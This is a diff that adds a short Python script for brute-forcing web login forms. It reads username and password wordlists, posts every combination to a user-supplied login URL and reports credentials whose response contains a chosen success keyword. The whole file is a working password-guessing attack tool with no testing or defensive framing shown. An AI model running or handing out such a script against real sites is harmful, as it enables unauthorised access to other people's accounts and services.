@@ -1,0 +1,56 @@
+import requests
+import sys
+import os
+
+# Get inputs from user
+target = input("Enter the login URL (e.g., https://example.com/login): ").strip()
+username_file = input("Enter path to the username list file: ").strip()
+password_file = input("Enter path to the password list file: ").strip()
+needle = input("Enter the success keyword (e.g., 'welcome back'): ").strip()
+
+# Check if files exist
+if not os.path.isfile(username_file):
+    print(f"[!] Error: Username file '{username_file}' does not exist.")
+    sys.exit(1)
+
+if not os.path.isfile(password_file):
+    print(f"[!] Error: Password file '{password_file}' does not exist.")
+    sys.exit(1)
+
+# Read usernames from file
+with open(username_file, "r") as uf:
+    usernames = [u.strip() for u in uf if u.strip()]
+
+# Loop through each username
+for username in usernames:
+    found = False
+    try:
+        with open(password_file, "r") as pf:
+            for password in pf:
+                password = password.strip()
+                # Display attempt
+                sys.stdout.write(f"[x] Trying {username}:{password}\r")
+                sys.stdout.flush()
+
+                # Send POST request
+                response = requests.post(target, data={
+                    "username": username,
+                    "password": password
+                })
+
+                # Check for success indicator
+                if needle.lower().encode() in response.content.lower():
+                    sys.stdout.write("\n")
+                    print(f"[>>>>] Success! Username: '{username}' | Password: '{password}'")
+                    found = True
+                    break
+
+        if not found:
+            sys.stdout.write("\n")
+            print(f"[-] No valid password found for user '{username}'.\n")
+
+    except requests.RequestException as e:
+        print(f"\n[!] Network error occurred: {e}")
+        sys.exit(1)
+
+print("\n[+] Finished testing all combinations.")
